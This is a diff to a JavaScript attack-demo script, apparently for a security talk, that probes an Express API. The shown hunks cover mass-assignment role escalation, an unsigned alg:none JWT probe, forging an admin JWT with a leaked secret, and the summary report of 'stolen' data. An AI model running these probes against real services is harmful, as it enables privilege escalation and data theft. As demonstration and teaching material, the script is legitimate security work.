+    escalate.json.user.role === "admin" && escalate.json.user.balance === 1_000_000) {
+    stolen.escalated = loginOk.user.role !== "admin";
+    bad(`User #${escId} has role=admin and balance=${escalate.json.user.balance}`);
+    loot("new-role", escalate.json.user.role);
+    loot("new-balance", String(escalate.json.user.balance));
     record(
       "CRITICAL",
-      "Admin route checks login only, not role",
-      "requireAuth ≠ requireRole — BFLA",
-      { kind: "app-code", owasp: "API5" }
+      "Mass assignment privilege escalation",
+      "No field allowlist on PUT body - app merged raw JSON into the user",
+      { kind: "app-code", owasp: "API3" }
     );
+  } else {
+    info(`Mass assignment → ${escalate.status}`);
   }
 
   // One probe we EXPECT to fail. jsonwebtoken v9 defaults to an HS* allowlist
@@ -1771,7 +1745,7 @@ async function phaseAuthzAndForgery() {
     headers: { Authorization: `Bearer ${noneToken}` },
     label: "jwt-alg-none",
   });
-  if (noneRes.status === 200) {
+  if (noneRes.status === 200 && noneRes.json?.user?.id === 3) {
     bad("Server accepted an UNSIGNED alg:none token");
     record(
       "CRITICAL",
@@ -1779,11 +1753,13 @@ async function phaseAuthzAndForgery() {
       "Verification did not pin an algorithm allowlist",
       { kind: "app-code", owasp: "API2" }
     );
-  } else {
+  } else if (noneRes.status === 401) {
     ok(
       `alg:none rejected (${noneRes.status}) — jsonwebtoken v9 pins HS256/384/512 for string secrets, not the app`
     );
     info("You did not configure this. A library maintainer did. That is the whole talk.");
+  } else {
+    info(`Unsigned-token probe inconclusive (${noneRes.status}); signature rejection not confirmed`);
   }
 
   if (stolen.jwtSecret) {
@@ -1804,21 +1780,23 @@ async function phaseAuthzAndForgery() {
       },
       stolen.jwtSecret
     );
-    stolen.forgedAdminToken = forged;
     loot("forged-jwt", forged);
     const me = await http("GET", "/api/me", {
       headers: { Authorization: `Bearer ${forged}` },
       label: "forged-admin-me",
     });
-    if (me.status === 200) {
+    if (me.status === 200 && me.json?.user?.id === admin.id && me.json.user.role === "admin") {
+      stolen.forgedAdminToken = forged;
       bad("Server accepted a fully attacker-forged admin JWT");
       loot("forged-identity", JSON.stringify(me.json?.user));
       record(
         "CRITICAL",
         "Forged JWTs accepted (weak/leaked secret)",
-        "HS256 + known secret — JWT alone is not a security model",
+        "A forged token returned the intended admin identity. Signature verification is expected to accept correctly signed tokens; disclosure/weakness of the key is the authentication compromise.",
         { kind: "app-code", owasp: "API2" }
       );
+    } else {
+      info(`Forged admin identity not confirmed (${me.status}); generated token is not counted as accepted`);
     }
   } else {
     info("No JWT secret recovered — skip forgery");
@@ -1870,7 +1848,8 @@ ${c.bold}${c.green}╔═══════════════════�
     · Body: prefer express.json() default 100kb; raise only per-route if needed
     · Stacks: don't hand-roll an error handler that returns err.stack — Express's
       finalhandler already omits it when NODE_ENV=production
-    · CORS: never origin:"*" for credentialed/browser APIs; allowlist origins\n`);
+    · CORS: use an origin policy appropriate to the data. Wildcards allow
+      non-credentialed reads, not victim cookie-session response access\n`);
 
   console.log(`  ${c.blue}${c.bold}(framework-gap)${c.reset} — Express does not ship these; you must add them
     · Rate limit / login throttle (e.g. express-rate-limit)
@@ -1920,11 +1899,12 @@ ${c.bold}${c.red}╔════════════════════
   console.log(`  ${c.bold}Target${c.reset}          ${BASE}`);
   console.log(`  ${c.bold}HTTP requests${c.reset}   ${reqSeq}`);
   console.log(`  ${c.bold}Elapsed${c.reset}         ${elapsedSec}s`);
-  console.log(`  ${c.bold}Findings${c.reset}        ${stolen.findings.length}`);
+  console.log(`  ${c.bold}Finding records${c.reset} ${stolen.findings.length} (cumulative, not unique root causes)`);
+  console.log("  Severity: demo author ratings, not OWASP scores or CVSS. API tags map to the 2023 edition; CWE tags identify specific weaknesses.");
   console.log(`  ${c.bold}By severity${c.reset}     ${JSON.stringify(bySev)}`);
   console.log(`  ${c.bold}By kind${c.reset}         ${JSON.stringify(byKind)}`);
   console.log(
-    `  ${c.bold}OWASP API${c.reset}        ${owaspHits.length ? owaspHits.join(", ") : "—"}`
+    `  ${c.bold}OWASP API 2023${c.reset}   ${owaspHits.length ? owaspHits.join(", ") : "—"}`
   );
   console.log(`  ${c.bold}Users stolen${c.reset}     ${stolen.users.length}`);
   console.log(`  ${c.bold}Orders stolen${c.reset}    ${stolen.orders.length}`);
@@ -1940,11 +1920,11 @@ ${c.bold}${c.red}╔════════════════════
   console.log(`    ${c.green}"We use Express 5 + JWT. Deployed to the cloud. We're secured."${c.reset}`);
   console.log(`\n  ${c.bold}What the console just proved:${c.reset}`);
   console.log(
-    `    ${c.red}Most damage needed no password. JWT only gated a few routes.` +
+    `    ${c.red}Review the recorded response evidence above; inconclusive probes are not confirmed exploits.` +
     ` Authn ≠ authz. Edge WAF ≠ API authorization.${c.reset}`
   );
   console.log(
-    `    ${c.yellow}Claim: your framework gives you almost nothing — and nothing is not a security model.${c.reset}`
+    `    ${c.yellow}Framework and library defaults help; application authorization, data minimization, and destination policies remain explicit responsibilities.${c.reset}`
   );
   console.log(
     `    ${c.dim}kind legend: framework-gap = Express has no control;` +
@@ -2029,6 +2009,9 @@ ${c.bold}${c.red}╔════════════════════
       JSON.stringify(
         {
           target: BASE,
+          owaspEdition: 2023,
+          severityScheme: "demo-author-rated",
+          counting: "finding-records-not-unique-root-causes",
           requests: reqSeq,
           elapsedSeconds: Number(elapsedSec),
           findings: stolen.findings,
